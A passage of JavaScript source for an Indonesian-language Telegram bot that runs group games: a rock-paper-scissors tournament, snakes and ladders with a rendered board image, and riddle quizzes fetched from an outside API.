            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto Topolaroid.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.topolaroidAsk = null;
});
// ===================== FITUR SUIT (BATU-GUNTING-KERTAS) =====================
const suitRooms = {};
const SUIT_TARGET_SCORE = 5; // poin menang per match

function normalizeSuitChoice(text) {
  if (!text || typeof text !== 'string') return null;
  let t = text.trim().toLowerCase();
  if (t.startsWith('/')) t = t.slice(1);

  if (t === 'batu' || t === '👊' || t === '👊🏻') return 'batu';
  if (t === 'gunting' || t === '✌' || t === '✌🏻') return 'gunting';
  if (t === 'kertas' || t === '🖐' || t === '🖐🏻' || t === '✋') return 'kertas';
  return null;
}

function decideSuit(p1Id, p1Choice, p2Id, p2Choice) {
  if (p1Choice === p2Choice) return { type: 'draw' };

  const winMap = {
    batu: 'gunting',
    gunting: 'kertas',
    kertas: 'batu'
  };

  if (winMap[p1Choice] === p2Choice) {
    return { type: 'win', winner: p1Id, loser: p2Id };
  } else {
    return { type: 'win', winner: p2Id, loser: p1Id };
  }
}

// mulai satu match (p1 vs p2)
async function startSuitMatch(chatId) {
  const room = suitRooms[chatId];
  if (!room) return;

  if (room.roundIndex >= room.roundPairs.length) return;

  const pair = room.roundPairs[room.roundIndex];
  const p1Id = pair.p1Id;
  const p2Id = pair.p2Id;

  const p1 = room.players.find(p => p.id === p1Id);
  const p2 = room.players.find(p => p.id === p2Id);
  if (!p1 || !p2) return;

  const g1 = room.groupMap[p1Id] || '?';
  const g2 = room.groupMap[p2Id] || '?';

  room.currentMatch = {
    p1Id,
    p2Id,
    p1Name: p1.name,
    p2Name: p2.name,
    scores: { [p1Id]: 0, [p2Id]: 0 }
  };
  room.currentChoices = {};

  await bot.sendMessage(
    chatId,
    `🃏 Ronde ${room.roundNumber} – Match ${room.roundIndex + 1}\n` +
    `Grup ${g1}: ${p1.name} vs Grup ${g2}: ${p2.name}\n\n` +
    `Main sampai ${SUIT_TARGET_SCORE} poin.\n` +
    `Sekarang giliran ${p1.name} dan ${p2.name} memilih suit di chat pribadi bot.`
  );

  const msgP1 =
    `Giliranmu bermain suit melawan ${p2.name}.\n` +
    `Ketik salah satu: /batu, /gunting, atau /kertas`;
  const msgP2 =
    `Giliranmu bermain suit melawan ${p1.name}.\n` +
    `Ketik salah satu: /batu, /gunting, atau /kertas`;

  bot.sendMessage(p1Id, msgP1).catch(() => {});
  bot.sendMessage(p2Id, msgP2).catch(() => {});
}

// pasangan per ronde: (1,2), (3,4) dst
async function setupSuitRound(chatId, participantsIds) {
  const room = suitRooms[chatId];
  if (!room) return;

  const ids = participantsIds.slice();
  const pairs = [];
  const advancing = [];

  for (let i = 0; i + 1 < ids.length; i += 2) {
    pairs.push({ p1Id: ids[i], p2Id: ids[i + 1] });
  }

  if (ids.length % 2 === 1) {
    const byeId = ids[ids.length - 1];
    advancing.push(byeId);
    const byePlayer = room.players.find(p => p.id === byeId);
    if (byePlayer) {
      await bot.sendMessage(
        chatId,
        `🎫 ${byePlayer.name} mendapat bye ke ronde berikutnya (tanpa bermain).`
      );
    }
  }

  room.roundPairs = pairs;
  room.roundIndex = 0;
  room.advancing = advancing;
  room.roundNumber = room.roundNumber || 1;

  if (pairs.length === 0) {
    if (advancing.length === 1) {
      const champ = room.players.find(p => p.id === advancing[0]);
      if (champ) {
        await bot.sendMessage(chatId, `🏆 Pemenang turnamen suit adalah ${champ.name}!`);
      }
      delete suitRooms[chatId];
    }
    return;
  }

  await startSuitMatch(chatId);
}

// ===== /suitroom =====
bot.onText(/^\/suitroom(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;

  if (suitRooms[chatId]) {
    const room = suitRooms[chatId];
    return bot.sendMessage(
      chatId,
      `❌ Sudah ada room Suit di grup ini.\n` +
      `Creator: ${room.creatorName}\n` +
      `Gunakan /suitexit untuk menutup room.`
    );
  }

  const name = getDisplayName(user);

  suitRooms[chatId] = {
    creatorId: user.id,
    creatorName: name,
    started: false,
    players: [{ id: user.id, name }],
    groupMap: { [user.id]: 1 },
    roundNumber: 1,
    roundPairs: [],
    roundIndex: 0,
    advancing: [],
    currentMatch: null,
    currentChoices: {}
  };

  await bot.sendMessage(
    chatId,
    `🃏 Room Suit dibuat!\n\n` +
    `Creator: ${name}\n` +
    `Pemain: 1 (min 4, max 10, dan harus kelipatan 4: 4 atau 8 pemain)\n` +
    `Grup 1: ${name}\n\n` +
    `Pemain lain bisa /suitjoin untuk gabung.\n` +
    `Creator ketik /suitstart untuk memulai turnamen.`
  );

  bot.sendMessage(
    user.id,
    `Kamu membuat room Suit di grup.\n` +
    `Nanti pilihan suit (batu/gunting/kertas) dilakukan di chat ini.`
  ).catch(() => {});
});

// ===== /suitjoin =====
bot.onText(/^\/suitjoin(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(
      chatId,
      `❌ Belum ada room Suit di grup ini.\nBuat dulu dengan /suitroom.`
    );
  }

  if (room.started) {
    return bot.sendMessage(chatId, `❌ Turnamen Suit sudah dimulai, tidak bisa join lagi.`);
  }

  if (room.players.some(p => p.id === user.id)) {
    return bot.sendMessage(chatId, `➥ Kamu sudah terdaftar sebagai pemain Suit.`);
  }

  if (room.players.length >= 10) {
    return bot.sendMessage(chatId, `❌ Room Suit sudah penuh (maksimal 10 pemain = 5 grup).`);
  }

  // wajib bisa DM
  try {
    await bot.sendMessage(
      user.id,
      `✅ Kamu berhasil join turnamen Suit di salah satu grup.\n` +
      `Setiap ronde, balas: /batu, /gunting, atau /kertas di sini.`
    );
  } catch (err) {
    return bot.sendMessage(
      chatId,
      `❌ ${getDisplayName(user)}, bot tidak bisa mengirim pesan ke kamu.\n` +
      `Silakan chat bot ini di privat dulu (Start), lalu /suitjoin lagi.`
    );
  }

  const name = getDisplayName(user);
  room.players.push({ id: user.id, name });

  // tiap 2 pemain = 1 grup
  const idx = room.players.length - 1;
  const groupNo = Math.floor(idx / 2) + 1;
  room.groupMap[user.id] = groupNo;

  const groups = {};
  for (const p of room.players) {
    const g = room.groupMap[p.id] || '?';
    if (!groups[g]) groups[g] = [];
    groups[g].push(p.name);
  }

  const groupsText = Object.keys(groups)
    .sort((a, b) => Number(a) - Number(b))
    .map(g => `Grup ${g}: ${groups[g].join(', ')}`)
    .join('\n');

  await bot.sendMessage(
    chatId,
    `✅ ${name} join turnamen Suit di Grup ${groupNo}!\n\n` +
    `Daftar grup sekarang:\n` +
    groupsText + `\n\nCreator bisa /suitstart kalau sudah cukup pemain.`
  );
});

// ===== /suitstart =====
bot.onText(/^\/suitstart(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Belum ada room Suit di grup ini. Buat dulu dengan /suitroom.`);
  }

  if (room.creatorId !== user.id) {
    return bot.sendMessage(chatId, `❌ Hanya creator room Suit yang bisa memulai turnamen.`);
  }

  if (room.started) {
    return bot.sendMessage(chatId, `➥ Turnamen Suit sudah berjalan.`);
  }

  const playerCount = room.players.length;
  if (playerCount < 4 || playerCount % 4 !== 0) {
    return bot.sendMessage(
      chatId,
      `❌ Jumlah pemain harus 4 atau 8 orang (kelipatan 4),` +
      ` karena 1 grup berisi 2 orang dan harus grup vs grup tanpa sisa.`
    );
  }

  // pastikan setiap grup berisi 2 orang dan jumlah grup genap
  const groups = {};
  for (const p of room.players) {
    const g = room.groupMap[p.id];
    if (!groups[g]) groups[g] = [];
    groups[g].push(p);
  }
  const groupNos = Object.keys(groups).map(Number).sort((a, b) => a - b);

  // tiap grup harus 2 orang
  for (const g of groupNos) {
    if (groups[g].length !== 2) {
      return bot.sendMessage(
        chatId,
        `❌ Grup ${g} belum berisi 2 orang penuh, tidak bisa mulai.`
      );
    }
  }
  if (groupNos.length % 2 !== 0) {
    return bot.sendMessage(
      chatId,
      `❌ Jumlah grup harus genap (2 atau 4 grup). Sekarang: ${groupNos.length} grup.`
    );
  }

  room.started = true;
  room.roundNumber = 1;

  // susun urutan peserta: G1A, G2A, G1B, G2B, G3A, G4A, G3B, G4B, ...
  const participantIds = [];
  for (let i = 0; i < groupNos.length; i += 2) {
    const gA = groups[groupNos[i]];
    const gB = groups[groupNos[i + 1]];

    // slot A (index 0), lalu slot B (index 1)
    participantIds.push(gA[0].id, gB[0].id);
    participantIds.push(gA[1].id, gB[1].id);
  }

  await bot.sendMessage(
    chatId,
    `🚀 Turnamen Suit dimulai!\n` +
    `Total pemain: ${playerCount} (grup: ${groupNos.length})\n` +
    `Setiap match: dua pemain suit sampai ${SUIT_TARGET_SCORE} poin (pemenang lanjut ke babak selanjutnya).\n` +
    `Pilihan suit dilakukan di chat pribadi, bukan di grup.`
  );

  await setupSuitRound(chatId, participantIds);
});

// ===== /suitexit =====
bot.onText(/^\/suitexit(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.chat || msg.chat.type === 'private') {
    return bot.sendMessage(chatId, 'Perintah ini hanya untuk grup.');
  }

  const user = msg.from;
  const room = suitRooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Tidak ada turnamen Suit aktif di grup ini.`);
  }

  if (room.creatorId !== user.id) {
    return bot.sendMessage(chatId, `❌ Hanya creator room Suit yang bisa menghentikan turnamen.`);
  }

  delete suitRooms[chatId];

  await bot.sendMessage(chatId, `🛑 Turnamen Suit dibatalkan oleh ${getDisplayName(user)}.`);
});

// ===== HANDLER PRIVATE CHAT UNTUK SUIT =====

bot.on('message', async (msg) => {
  if (!msg.chat || msg.chat.type !== 'private') return;
  if (!msg.text) return;

  const userId = msg.from.id;
  const choice = normalizeSuitChoice(msg.text);
  if (!choice) return;

  let targetChatId = null;
  let room = null;

  for (const [chatIdStr, r] of Object.entries(suitRooms)) {
    if (!r.started || !r.currentMatch) continue;
    const { p1Id, p2Id } = r.currentMatch;
    if (p1Id === userId || p2Id === userId) {
      targetChatId = Number(chatIdStr);
      room = r;
      break;
    }
  }

  if (!room || !targetChatId) return;

  const { p1Id, p2Id, p1Name, p2Name, scores } = room.currentMatch;

  if (!room.currentChoices) room.currentChoices = {};
  if (room.currentChoices[userId]) {
    return bot.sendMessage(
      userId,
      `Kamu sudah memilih "${room.currentChoices[userId]}". Tunggu lawanmu.`
    );
  }

  room.currentChoices[userId] = choice;
  await bot.sendMessage(userId, `✅ Kamu memilih: ${choice}. Tunggu lawanmu memilih.`);

  const c1 = room.currentChoices[p1Id];
  const c2 = room.currentChoices[p2Id];

  if (!c1 || !c2) return;

  const result = decideSuit(p1Id, c1, p2Id, c2);

  let groupMsg =
    `🃏 Hasil suit ${p1Name} vs ${p2Name}:\n` +
    `${p1Name} memilih: ${c1}\n` +
    `${p2Name} memilih: ${c2}\n`;

  if (result.type === 'draw') {
    groupMsg += `\n👏🏻 Seri! Tidak ada yang mendapat poin.`;
  } else {
    const winnerId = result.winner;
    const loserId = result.loser;
    scores[winnerId] = (scores[winnerId] || 0) + 1;
    scores[loserId] = scores[loserId] || 0;

    const winnerName = winnerId === p1Id ? p1Name : p2Name;
    groupMsg += `\n🏅 Pemenang ronde ini: ${winnerName}\n` +
                `Skor sekarang:\n` +
                `${p1Name}: ${scores[p1Id] || 0}\n` +
                `${p2Name}: ${scores[p2Id] || 0}`;
  }

  room.currentChoices = {};

  const scoreP1 = scores[p1Id] || 0;
  const scoreP2 = scores[p2Id] || 0;
  let matchFinished = false;
  let matchWinnerId = null;
  let matchWinnerName = null;

  if (scoreP1 >= SUIT_TARGET_SCORE || scoreP2 >= SUIT_TARGET_SCORE) {
    matchFinished = true;
    if (scoreP1 > scoreP2) {
      matchWinnerId = p1Id;
      matchWinnerName = p1Name;
    } else {
      matchWinnerId = p2Id;
      matchWinnerName = p2Name;
    }

    groupMsg += `\n\n🎉 Match selesai!\n` +
                `Pemenang match: ${matchWinnerName} (skor ${scoreP1} - ${scoreP2}).`;
  } else if (result.type !== 'draw') {
    groupMsg += `\n\nLanjut ronde berikutnya pada match yang sama.\n` +
                `Pilih lagi di chat pribadi.`;
    bot.sendMessage(p1Id, `Ronde berikutnya vs ${p2Name}.\nBalas: /batu, /gunting, atau /kertas.`);
    bot.sendMessage(p2Id, `Ronde berikutnya vs ${p1Name}.\nBalas: /batu, /gunting, atau /kertas.`);
  } else {
    bot.sendMessage(p1Id, `Seri.\nBalas lagi: /batu, /gunting, atau /kertas.`);
    bot.sendMessage(p2Id, `Seri.\nBalas lagi: /batu, /gunting, atau /kertas.`);
  }

  await bot.sendMessage(targetChatId, groupMsg);

  if (!matchFinished) return;

  room.advancing.push(matchWinnerId);

  room.roundIndex += 1;

  if (room.roundIndex < room.roundPairs.length) {
    await startSuitMatch(targetChatId);
    return;
  }

  const nextParticipants = room.advancing.slice();
  room.currentMatch = null;
  room.currentChoices = {};
  room.roundPairs = [];
  room.roundIndex = 0;
  room.advancing = [];

  if (nextParticipants.length === 1) {
    const champ = room.players.find(p => p.id === nextParticipants[0]);
    if (champ) {
      await bot.sendMessage(
        targetChatId,
        `🏆 Turnamen Suit selesai!\nPemenang akhirnya adalah: ${champ.name}!`
      );
    }
    delete suitRooms[targetChatId];
    return;
  }

  room.roundNumber += 1;

  await bot.sendMessage(
    targetChatId,
    `\n💫 Ronde ${room.roundNumber} akan dimulai.\n` +
    `Pemain yang lolos: ` +
    nextParticipants
      .map(id => {
        const pl = room.players.find(p => p.id === id);
        return pl ? pl.name : id;
      })
      .join(', ')
  );

  await setupSuitRound(targetChatId, nextParticipants);
});
const Jimp = require('jimp');
const BOARD_IMAGE_PATH = path.join(__dirname, 'assets', 'board.jpg');

// Papan 1–100
const BOARD_SIZE = 100;

// ======== DATA ULAR & TANGGA (DARI GAMBAR) ========
// Tangga: naik
const LADDERS = {
  2: 39,
  5: 14,
  9: 31,
  28: 55,
  36: 84,
  40: 62,
  51: 68,
  71: 90,
  80: 100
};

// Ular: turun
const SNAKES = {
  16: 6,
  62: 18,
  64: 60,
  54: 34,
  74: 25,
  93: 73,
  95: 75,
  98: 79
};

// Warna pion per pemain (maks 10)
const PLAYER_COLORS = [
  { name: 'Merah',   color: 0xFF0000FF },
  { name: 'Biru',    color: 0x0000FFFF },
  { name: 'Hijau',   color: 0x00FF00FF },
  { name: 'Kuning',  color: 0xFFFF00FF },
  { name: 'Magenta', color: 0xFF00FFFF },
  { name: 'Cyan',    color: 0x00FFFFFF },
  { name: 'Putih',   color: 0xFFFFFFFF },
  { name: 'Abu-abu', color: 0x808080FF },
  { name: 'Oranye',  color: 0xFFA500FF },
  { name: 'Ungu',    color: 0x800080FF }
];

// ======== STATE GAME ========
// rooms[chatId] = {
//   creatorId,
//   creatorName,
//   started,
//   players: [{ id, name }],
//   positions: { [userId]: number },
//   currentTurnIndex
// }
const rooms = {};

// Ambil nama user yang enak dibaca
function getDisplayName(user) {
  if (user.username) return '@' + user.username;
  const full = [user.first_name, user.last_name].filter(Boolean).join(' ');
  return full || String(user.id);
}

// Hitung titik tengah kotak dari nomor (1–100)
function getCellCenter(pos, width, height) {
  if (pos < 1) pos = 1;
  if (pos > BOARD_SIZE) pos = BOARD_SIZE;

  const rowFromBottom = Math.floor((pos - 1) / 10); // 0 = baris bawah
  const colInRow = (pos - 1) % 10;

  let xIndex;
  if (rowFromBottom % 2 === 0) {
    // baris: kiri -> kanan
    xIndex = colInRow;
  } else {
    // baris: kanan -> kiri
    xIndex = 9 - colInRow;
  }

  const yIndexFromTop = 9 - rowFromBottom; // 0 = atas

  const cellW = width / 10;
  const cellH = height / 10;

  const centerX = Math.round((xIndex + 0.5) * cellW);
  const centerY = Math.round((yIndexFromTop + 0.5) * cellH);

  return { x: centerX, y: centerY };
}

// Gambar kotak warna kecil sebagai pion
function drawMarker(image, x, y, size, color) {
  const half = Math.floor(size / 2);
  for (let dx = -half; dx <= half; dx++) {
    for (let dy = -half; dy <= half; dy++) {
      const px = x + dx;
      const py = y + dy;
      if (
        px >= 0 &&
        py >= 0 &&
        px < image.bitmap.width &&
        py < image.bitmap.height
      ) {
        image.setPixelColor(color, px, py);
      }
    }
  }
}

// =============== /createroom ===============
bot.onText(/^\/createroom(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;

  if (rooms[chatId]) {
    const room = rooms[chatId];
    return bot.sendMessage(
      chatId,
      `❌ Sudah ada room Ular Tangga di chat ini.\n\n` +
      `• Creator: ${room.creatorName}\n` +
      `• Gunakan /exit dulu untuk menutup room lama.`
    );
  }

  const name = getDisplayName(user);

  rooms[chatId] = {
    creatorId: user.id,
    creatorName: name,
    started: false,
    players: [{ id: user.id, name }],
    positions: { [user.id]: 0 },
    currentTurnIndex: 0
  };

  return bot.sendMessage(
    chatId,
    `🎲 Room Ular Tangga dibuat!\n\n` +
    `👑 Creator: ${name}\n` +
    `👥 Pemain: 1 (min 2, max 10)\n\n` +
    `Pemain lain bisa /join untuk gabung.\n` +
    `Kalau sudah cukup, creator bisa /letsgo untuk mulai.`
  );
});

// =============== /join ===============
bot.onText(/^\/join(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const room = rooms[chatId];

  if (!room) {
    return bot.sendMessage(
      chatId,
      `❌ Belum ada room Ular Tangga di chat ini.\nBuat dulu dengan /createroom`
    );
  }

  if (room.started) {
    return bot.sendMessage(chatId, `❌ Game sudah dimulai, tidak bisa join lagi.`);
  }

  if (room.players.some(p => p.id === user.id)) {
    return bot.sendMessage(chatId, `➥ Kamu sudah jadi pemain di room ini.`);
  }

  if (room.players.length >= 10) {
    return bot.sendMessage(chatId, `❌ Room sudah penuh (maksimal 10 pemain).`);
  }

  const name = getDisplayName(user);
  room.players.push({ id: user.id, name });
  room.positions[user.id] = 0;

  const listPemain = room.players
    .map((p, i) => {
      const colorName = PLAYER_COLORS[i]?.name || '-';
      return `${i + 1}. ${p.name} (${colorName})`;
    })
    .join('\n');

  return bot.sendMessage(
    chatId,
    `✅ ${name} bergabung ke game!\n\n` +
    `👥 Daftar pemain sekarang (${room.players.length}/10)\n` +
    `${listPemain}\n\n` +
    `Creator bisa ketik /letsgo kalau sudah siap.`
  );
});

// =============== /letsgo ===============
bot.onText(/^\/letsgo(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const room = rooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Belum ada room Ular Tangga di chat ini. Buat dulu dengan /createroom`);
  }

  if (user.id !== room.creatorId) {
    return bot.sendMessage(chatId, `❌ Hanya creator room yang bisa memulai game.`);
  }

  if (room.started) {
    return bot.sendMessage(chatId, `➥ Game sudah berjalan.`);
  }

  if (room.players.length < 2) {
    return bot.sendMessage(chatId, `❌ Minimal butuh 2 pemain untuk mulai game.`);
  }

  room.started = true;
  room.currentTurnIndex = 0;

  const listPemain = room.players
    .map((p, i) => {
      const colorName = PLAYER_COLORS[i]?.name || '-';
      return `${i + 1}. ${p.name} (${colorName})`;
    })
    .join('\n');

  const currentPlayer = room.players[room.currentTurnIndex];

  return bot.sendMessage(
    chatId,
    `🚀 Game Ular Tangga dimulai!\n\n` +
    `👥 Pemain (${room.players.length}):\n` +
    `${listPemain}\n\n` +
    `🎯 Tujuan: capai kotak ${BOARD_SIZE} duluan.\n` +
    `🎲 Giliran pertama: ${currentPlayer.name}\n\n` +
    `Ketik /dadu untuk mengocok dadu.`
  );
});

// =============== /dadu ===============
bot.onText(/^\/dadu(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const room = rooms[chatId];

  // Hapus pesan /dadu dari user
  bot.deleteMessage(chatId, msg.message_id).catch(() => {});

  if (!room || !room.started) {
    return bot.sendMessage(
      chatId,
      `❌ Belum ada game Ular Tangga yang berjalan.\nBuat dulu dengan /createroom lalu /join dan /letsgo.`
    );
  }

  const currentPlayer = room.players[room.currentTurnIndex];

  if (user.id !== currentPlayer.id) {
    return bot.sendMessage(
      chatId,
      `⏳ Bukan giliranmu, ${getDisplayName(user)}.\n` +
      `Sekarang giliran: ${currentPlayer.name}`
    );
  }

  // Kocok dadu 1–6
  const dice = Math.floor(Math.random() * 6) + 1;
  const oldPos = room.positions[user.id] || 0;
  let newPos = oldPos + dice;

  if (newPos > BOARD_SIZE) newPos = BOARD_SIZE;

  let finalPos = newPos;
  let extraInfo = '';

  // Cek tangga dulu
  if (LADDERS[newPos]) {
    finalPos = LADDERS[newPos];
    extraInfo = `\n🪜 Kena tangga! Naik dari ${newPos} ke ${finalPos}`;
  }
  // Kalau bukan tangga, cek ular
  else if (SNAKES[newPos]) {
    finalPos = SNAKES[newPos];
    extraInfo = `\n🐍 Kena ular! Turun dari ${newPos} ke ${finalPos}`;
  }

  room.positions[user.id] = finalPos;

  const isWin = finalPos >= BOARD_SIZE;

  // Posisi semua pemain
  const posisiSemua = room.players
    .map((p, i) => {
      const pos = room.positions[p.id] ?? 0;
      const marker = p.id === user.id ? '👉 ' : '';
      const colorName = PLAYER_COLORS[i]?.name || '-';
      return `${marker}${p.name} (${colorName}): ${pos}`;
    })
    .join('\n');

  let caption =
    `🎲 ${currentPlayer.name} mengocok dadu.\n` +
    `Hasil dadu: ${dice}\n\n` +
    `🍭 Posisi: ${oldPos} ➜ ${finalPos} dari ${BOARD_SIZE}` +
    extraInfo +
    `\n\n✏️ Posisi pemain saat ini:\n` +
    `${posisiSemua}`;

  if (isWin) {
    caption += `\n\n🏆 ${currentPlayer.name} MENANG! 🎉\n\nGame selesai. Terima kasih sudah bermain!`;
  } else {
    room.currentTurnIndex = (room.currentTurnIndex + 1) % room.players.length;
    const nextPlayer = room.players[room.currentTurnIndex];
    caption += `\n\n➥ Sekarang giliran: ${nextPlayer.name}\n` +
               `Ketik /dadu untuk mengocok dadu.`;
  }

  try {
    // Load gambar papan dari file lokal
    const image = await Jimp.read(BOARD_IMAGE_PATH);

    // Gambar pion semua pemain
    room.players.forEach((p, i) => {
      const pos = room.positions[p.id] ?? 0;
      if (pos <= 0) return;

      const { x, y } = getCellCenter(
        pos,
        image.bitmap.width,
        image.bitmap.height
      );
      const color = PLAYER_COLORS[i]?.color || 0xFFFFFFFF;
      drawMarker(image, x, y, 18, color); // pion 18x18 px
    });

    const buffer = await image.getBufferAsync(Jimp.MIME_JPEG);

    const sent = await bot.sendPhoto(chatId, buffer, { caption });

    // Hapus foto setelah 7 detik
    setTimeout(() => {
      bot.deleteMessage(chatId, sent.message_id).catch(() => {});
    }, 70000);
  } catch (e) {
    console.error('Gagal generate gambar ular tangga:', e);
    // Fallback: kirim teks saja
    await bot.sendMessage(chatId, caption);
  }

  if (isWin) {
    delete rooms[chatId];
  }
});

// =============== /exit ===============
bot.onText(/^\/exit(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const room = rooms[chatId];

  if (!room) {
    return bot.sendMessage(chatId, `❌ Tidak ada game Ular Tangga aktif di chat ini.`);
  }

  if (user.id !== room.creatorId) {
    return bot.sendMessage(chatId, `❌ Hanya creator room yang bisa menghentikan game.`);
  }

  delete rooms[chatId];

  return bot.sendMessage(
    chatId,
    `🛑 Game Ular Tangga telah dihentikan oleh ${getDisplayName(user)}.`
  );
});

// =============== /start ===============
bot.onText(/^\/ulartangga(?:@\w+)?$/i, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `Welcome! Game Ular Tangga 🐍🪜\n\n` +
    `Perintah:\n` +
    `• /createroom - Buat room\n` +
    `• /join - Gabung room\n` +
    `• /letsgo - Mulai game (creator)\n` +
    `• /dadu - Kocok dadu\n` +
    `• /exit - Stop game (creator)`
  );
});
const asahOtakAktif = {};
// ============== COMMAND /asahotak ==============
bot.onText(/\/asahotak(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await axios.get("https://api-faa.my.id/faa/asahotak");
    const data = res.data;

    if (!data || !data.status || !data.result) {
      return bot.sendMessage(chatId, "⚠️ Gagal mengambil soal asah otak.");
    }

    const soal = data.result.soal;
    const jawaban = String(data.result.jawaban || "")
      .toLowerCase()
      .trim();

    const sent = await bot.sendMessage(
      chatId,
      `🧠 *Game Asah Otak*\n\n❓ ${soal}\n\n💬 *Balas (reply) pesan ini untuk menjawab.*\n\nKetik */nyerah* (reply ke soal ini) untuk melihat jawaban.`,
      { parse_mode: "Markdown" }
    );

    // Simpan sesi soal
    const key = `${chatId}:${sent.message_id}`;
    asahOtakAktif[key] = {
      answer: jawaban,
    };
  } catch (err) {
    console.error("Error asahotak:", err.message);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat menghubungi API Asah Otak.");
  }
});
// ============== CEK JAWABAN / NYERAH (HARUS REPLY) ==============
bot.on("message", async (msg) => {
  if (msg.from?.is_bot) return;
  if (!msg.reply_to_message) return;

  const chatId = msg.chat.id;
  const replied = msg.reply_to_message;
  const key = `${chatId}:${replied.message_id}`;

  let sesi = null;
  let mapRef = null;

  if (tebakanAktif[key]) {
    sesi = tebakanAktif[key];
    mapRef = tebakanAktif;
  } else if (tekatekiAktif[key]) {
    sesi = tekatekiAktif[key];
    mapRef = tekatekiAktif;
  } else if (asahOtakAktif[key]) {
    sesi = asahOtakAktif[key];
    mapRef = asahOtakAktif;
  }

  // Kalau bukan reply ke game
  if (!sesi) return;

  const text = String(msg.text || "").toLowerCase().trim();
  if (!text) return;

  // ===== /NYERAH =====
  if (text.startsWith("/nyerah")) {
    await bot.sendMessage(
      chatId,
      `😵 Kamu menyerah.\n\n✅ Jawaban yang benar adalah:\n*${sesi.answer}*`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );
    delete mapRef[key];
    return;
  }

  // ===== CEK JAWABAN =====
  if (text === sesi.answer) {
    await bot.sendMessage(
      chatId,
      `✅ Jawaban *BENAR*, ${msg.from.first_name}! 🔥`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );
    delete mapRef[key];
  } else {
    await bot.sendMessage(
      chatId,
      `❌ Jawaban salah, coba lagi!`,
      {
        reply_to_message_id: msg.message_id,
      }
    );
  }
});
// Menyimpan soal aktif per pesan bot
// key: "chatId:messageId" -> { answer }
const tebakanAktif = {};
const tekatekiAktif = {};
// ============== COMMAND /tekateki ==============
bot.onText(/\/tekateki(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await axios.get("https://api-faa.my.id/faa/tekateki");
    const data = res.data;

    if (!data || !data.status || !data.result) {
      return bot.sendMessage(chatId, "⚠️ Gagal mengambil soal teka-teki dari API.");
    }

    const soal = data.result.soal;
    const jawaban = String(data.result.jawaban || "")
      .toLowerCase()
      .trim();

    // Kirim soal ke chat
    const sent = await bot.sendMessage(
      chatId,
      `🧩 *Game Teka-Teki*\n\n❓ ${soal}\n\n💬 *Balas (reply) pesan ini untuk menjawab.*\n\nKetik */nyerah* (dengan reply ke pesan ini) kalau mau lihat jawabannya.`,
      { parse_mode: "Markdown" }
    );

    // Simpan jawaban benar terkait dengan pesan soal itu
    const key = `${chatId}:${sent.message_id}`;
    tekatekiAktif[key] = {
      answer: jawaban,
    };
  } catch (err) {
    console.error("Error tekateki:", err.message);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat menghubungi API Teka-Teki.");
  }
});
// ============== CEK JAWABAN / MENYERAH (HARUS REPLY) ==============
bot.on("message", async (msg) => {
  // Abaikan pesan dari bot sendiri
  if (msg.from && msg.from.is_bot) return;

  const chatId = msg.chat.id;

  // Hanya proses jika pesan ini adalah reply
  if (!msg.reply_to_message) return;

  const replied = msg.reply_to_message;
  const key = `${chatId}:${replied.message_id}`;

  // Cek apakah reply ke soal Tebak-Tebakan atau Teka-Teki
  let sesi = null;
  let mapRef = null;

  if (tebakanAktif[key]) {
    sesi = tebakanAktif[key];
    mapRef = tebakanAktif;
  } else if (tekatekiAktif[key]) {
    sesi = tekatekiAktif[key];
    mapRef = tekatekiAktif;
  }

  // Kalau reply ke pesan lain yang bukan soal game, skip
  if (!sesi) return;

  const userAnswerRaw = String(msg.text || "");
  const userAnswer = userAnswerRaw.toLowerCase().trim();
  if (!userAnswer) return;

  // ==== FITUR /nyerah ====
  if (userAnswer.startsWith("/nyerah")) {
    await bot.sendMessage(
      chatId,
      `😵 Oke, kamu nyerah.\n\n✅ Jawaban yang benar adalah: *${sesi.answer}*`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );

    // Hapus sesi soal ini karena sudah dibocorin jawabannya
    delete mapRef[key];
    return;
  }

  // ==== CEK JAWABAN BIASA ====
  if (userAnswer === sesi.answer) {
    // Jawaban benar
    await bot.sendMessage(
      chatId,
      `✅ Jawaban *benar*, ${msg.from.first_name}!`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );

    // Setelah ada yang benar, hapus sesi soal ini
    delete mapRef[key];
  } else {
    // Jawaban salah
    await bot.sendMessage(
      chatId,
      `❌ Jawaban *salah*, coba lagi ya!`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      }
    );
  }
});
// COMMAND MULAI GAME
